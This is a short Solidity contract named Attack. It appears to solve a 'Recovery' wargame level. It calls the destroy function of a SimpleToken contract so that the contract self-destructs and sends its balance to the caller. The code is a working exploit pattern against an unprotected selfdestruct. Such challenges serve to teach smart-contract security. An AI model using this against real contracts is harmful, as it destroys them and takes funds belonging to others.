// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SimpleToken} from "./Recovery.sol";

contract Attack { 

    SimpleToken public simpleToken;

    constructor(address payable _simpleToken){
        simpleToken = SimpleToken(_simpleToken);
    }

    function attack() public {
        simpleToken.destroy(payable(msg.sender));
    }
    
}  
